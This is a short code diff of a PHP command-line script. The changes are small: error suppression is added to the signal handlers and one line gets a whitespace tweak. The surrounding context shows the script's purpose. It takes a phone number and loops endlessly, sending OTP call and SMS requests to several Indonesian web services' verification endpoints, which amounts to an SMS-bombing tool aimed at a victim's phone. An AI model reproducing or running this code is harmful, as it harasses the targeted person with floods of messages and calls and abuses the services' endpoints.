@@ -25,8 +25,8 @@ if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
     system('clear');
 }
 declare(ticks = 1);
-pcntl_signal(SIGTERM, "signal_handler");
-pcntl_signal(SIGINT, "signal_handler");
+@pcntl_signal(SIGTERM, "signal_handler");
+@pcntl_signal(SIGINT, "signal_handler");
 function signal_handler($signal) {
 	global $Y,$X;
 	switch($signal) {
@@ -68,7 +68,7 @@ if(is_numeric($argv[1])) {
 	echo "Calling     -> ".$G.$argv[1].$X."\n";
 	post_data('https://www.tokocash.com/oauth/otp',"msisdn=".$argv[1]."&accept=call");
 	while(1) {
-		echo "Send OTP To -> ".$G.$argv[1].$X."\n";
+		echo "Send OTP To -> ".$G.$argv[1].$X."\n";	
 		post_data("http://sc.jd.id/phone/sendPhoneSms","phone=".$argv[1]."&smsType=1");
 		post_data("https://www.phd.co.id/en/users/sendOTP","phone_number=".$argv[1]);
 	}
